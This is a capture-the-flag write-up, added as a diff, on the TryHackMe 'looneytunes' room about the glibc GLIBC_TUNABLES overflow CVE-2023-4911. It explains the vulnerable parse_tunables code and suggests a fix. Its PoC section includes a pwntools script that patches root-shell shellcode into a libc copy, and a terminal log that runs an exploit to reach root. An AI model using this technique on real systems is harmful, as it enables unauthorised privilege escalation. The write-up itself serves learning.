@@ -1,0 +1,217 @@
+# thm: looneytunes CVE-2023-4911
+
+https://tryhackme.com/room/looneytunes
+
+## Background
+
+### LD.SO: dynamic linker/loader
+
+ELF (Executable and Linkable Format) is a standard file format for executable files, object code, shared libraries, and core dumps. When an ELF file is executed, the operating system loads the required libraries and links them to the executable so that shared functions are available. On Linux, ld.so manages this process and is provided as part of the GNU C Library (glibc), which is the GNU Project’s implementation of the C standard library.
+
+    $ readelf /usr/bin/man -p .interp
+
+Usually, the required libraries are searched in a specific set of locations in the system, including the default /lib directory.
+
+    $ ldd /usr/bin/man
+    
+### Using DT_RPATH to Influence the Library Search Path
+
+When compiling a program, additional library search paths can be specified. These directories are embedded in the program’s ELF file and are parsed by ld.so when loading the executable. This mechanism allows the program to override the default library search path, causing it to search alternate locations for shared libraries before the system defaults.
+
+    $ gcc -Wl, — enable-new-dtags -Wl,-rpath=/tmp -o myapp myapp.c
+
+Whenever ld.so loads the executable, it will first check /tmp/ for libraries, then default to the regular library search path.
+
+### Modifying glibc Behavior via GLIBC_TUNABLES
+
+To understand the mechanics of this vulnerability, it is useful to examine the operation of the dynamic linker (ld.so). Upon execution, ld.so inspects certain environment variables known as GLIBC_TUNABLES, which serve as a form of runtime configuration. These tunables allow developers to dynamically modify the behavior of the runtime library.
+
+    GLIBC_TUNABLES="malloc.check=1:malloc.tcache_max=128
+
+The environment variable GLIBC_TUNABLES sets the maximum size chunk that may be stored in a tcache (in bytes).
+
+## Analysis
+
+The __tunables_init() takes one argument, envp, which is a pointer to an array of strings representing the environment variables. While loop iterates through the environment variables. Calls get_next_env, which retrieves the next environment variable and updates the pointers envp, envname, len, and envval. Then it checks if a tunable name is “GLBIC TUNABLE” and if so, it will duplicate via strdup. If the duplication was successful, parse_tunables is called to parse the value part (envval) of this environment variable. And finally, update it to the new envp.
+
+This code scans through the environment variables to find one named “GLIBC_TUNABLES”. When it finds this variable, it creates a duplicate of it, parses its value, and updates the environment variable list to use this new duplicated version. This is done to potentially modify the behavior of GLIBC based on tunable parameters defined in “GLIBC_TUNABLES”.
+```
+void
+__tunables_init (char **envp)
+{
+   char *envname = NULL;
+   char *envval = NULL;
+   size_t len = 0;
+   char **prev_envp = envp;
+
+   while ((envp = get_next_env (envp, &envname, &len, &envval, &prev_envp)) != NULL)
+{
+ if (tunable_is_name ("GLIBC_TUNABLES", envname))
+ {
+     char *new_env = tunables_strdup (envname);
+     if (new_env != NULL)
+         parse_tunables (new_env + len + 1, envval);
+     /* Put in the updated envval.  */
+     *prev_envp = new_env;
+     continue;
+ }
+}
+```
+Inside `parse_tunables()`, the code examines the copied `GLIBC_TUNABLES` to break it down into individual name-value pairs. It does this by searching for equal signs (=) and colons (:) in the copied data.
+
+Here’s where it gets interesting. The code is careful about security. It removes “dangerous tunables”, specifically those marked as `SXID_ERASE`. Those security-related tunables instruct GLIBC to modify security attributes or permissions from a process. These attributes could include changing elevated privileges, typically associated with set-user-ID (SUID) or set-group-ID (SGID) programs.
+
+The vulnerability occurs when `GLIBC_TUNABLES` contains unexpected input, like `tunable1=tunable2=AAA`. In this case, instead of gracefully handling it, the code copies the entire input as if it were a valid setting. This issue occurs when the tunables are of type `SXID_IGNORE`, which should not be removed. During the first iteration of the loop, the entire `tunable1=tunable2=AAA` is copied to tunestr, filling it up. Later, at lines 247–248, the code fails to increment the pointer (p) because no colon (‘:’) was found. 
+
+As a result, `p` continues to point to the value of `tunable1`, specifically `tunable2=AAA`. During the second iteration of the loop, `tunable2=AAA` is incorrectly appended to `tunestr`, leading to a buffer overflow since `tunestr` is already full.
+
+```
+static void
+parse_tunables (char *tunestr, char *valstring)
+{
+...
+  char *p = tunestr;
+  size_t off = 0;
+
+  while (true)
+    {
+      char *name = p;
+      size_t len = 0;
+
+      /* First, find where the name ends.  */
+      while (p[len] != '=' && p[len] != ':' && p[len] != '\0')
+        len++;
+
+      /* If we reach the end of the string before getting a valid name-value
+         pair, bail out.  */
+      if (p[len] == '\0')
+        {
+          if (__libc_enable_secure)
+            tunestr[off] = '\0';
+          return;
+        }
+
+      /* We did not find a valid name-value pair before encountering the
+         colon.  */
+      if (p[len]== ':')
+        {
+          p += len + 1;
+          continue;
+        }
+
+      p += len + 1;
+
+      /* Take the value from the valstring since we need to NULL terminate it.  */
+      char *value = &valstring[p - tunestr];
+      len = 0;
+
+      while (p[len] != ':' && p[len] != '\0')
+        len++;
+
+      /* Add the tunable if it exists.  */
+      for (size_t i = 0; i < sizeof (tunable_list) / sizeof (tunable_t); i++)
+        {
+          tunable_t *cur = &tunable_list[i];
+
+          if (tunable_is_name (cur->name, name))
+            {
+              if (__libc_enable_secure)
+                {
+                  if (cur->security_level != TUNABLE_SECLEVEL_SXID_ERASE)
+                    {
+                      if (off > 0)
+                        tunestr[off++] = ':';
+
+                      const char *n = cur->name;
+
+                      while (*n != '\0')
+                        tunestr[off++] = *n++;
+
+                      tunestr[off++] = '=';
+
+                      for (size_t j = 0; j < len; j++)
+                        tunestr[off++] = value[j];
+                    }
+
+                  if (cur->security_level != TUNABLE_SECLEVEL_NONE)
+                    break;
+                }
+
+              value[len] = '\0';
+              tunable_initialize (cur, value);
+              break;
+            }
+        }
+
+      if (p[len] != '\0')
+        p += len + 1;
+    }
+```
+In order to prevent this code from buffer overflow. Replace potentially unsafe functions like `strcpy`, `strcat`, or `sprintf` with their safer counterparts like `strncpy`, `strncat`, or `snprintf`, which allow specifying the buffer size to prevent overflows.
+
+In this scenario, it is possible to replace:
+
+    while (*n != '\0') tunestr[off++] = *n++;
+
+with something safer:
+
+    while (*n != '\0' && off < BUFFER_SIZE - 1) tunestr[off++] = *n++;
+
+`BUFFER_SIZE` should be defined as the maximum size of tunestr.
+
+## PoC
+```
+nopriv@looneytunes:~$ cat gen_libc.py 
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.os = "linux"
+context.arch = "x86_64"
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+d = bytearray(open(libc.path, "rb").read())
+
+sc = asm(shellcraft.setuid(0) + shellcraft.setgid(0) + shellcraft.sh())
+
+orig = libc.read(libc.sym["__libc_start_main"], 0x10)
+idx = d.find(orig)
+d[idx : idx + len(sc)] = sc
+
+open("./libc.so.6", "wb").write(d)
+```
+```
+nopriv@looneytunes:~$ python3 gen_libc.py 
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+nopriv@looneytunes:~$ gcc exp.c -o exploit 
+nopriv@looneytunes:~$ chmod +x exploit
+nopriv@looneytunes:~$ ./exploit 
+try 100
+try 200
+try 300
+try 400
+try 500
+try 600
+try 700
+try 800
+try 900
+try 1000
+^C
+nopriv@looneytunes:~$ ./exploit 
+try 100
+try 200
+try 300
+try 400
+try 500
+# whoami
+root
+# cd /root
+# cat root.txt
+THM{[REDACTED]}
+# exit
+```
